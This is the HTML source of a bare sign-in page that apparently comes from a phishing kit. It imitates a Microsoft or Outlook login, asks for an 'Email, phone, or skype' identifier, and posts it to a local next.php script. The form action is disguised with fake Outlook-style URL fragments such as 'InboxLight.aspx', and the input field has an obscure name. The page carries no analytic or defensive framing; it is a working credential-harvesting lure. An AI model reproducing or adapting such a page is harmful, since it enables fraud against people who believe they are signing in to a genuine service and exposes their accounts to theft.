
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
<title>Sign In</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<link rel="shortcut icon" href="images/favicoon.ico"/>
 
<link rel="stylesheet" href="css/style.css">
<body>
<div class="container1">
 
</div>
<div class="container">  
  <form id="contact" action="next.php?l=_Uiftyw_BhjodHHDKtoGYDw1774256418&fid.123InboxLight.aspxn.1774256418&fid.1252899645289964213InboxLight_Product" method="post" >
   <img src="images/logo.png" />
    
    <h1 class="row text-title">Sign in</h1>
     
    <fieldset>
      <input placeholder="Email, phone, or skype" type="text"  required name="uskkes1">
    </fieldset>
    <fieldset>
      <h4><img src="images/2.png" alt="" title="" border=0 width=179 height="64" ></h4>
    </fieldset>
     
    <fieldset>
      <input name="submit" type="submit" id="contact-submit"  value="Next">    </fieldset>
    
  </form>
</div>
 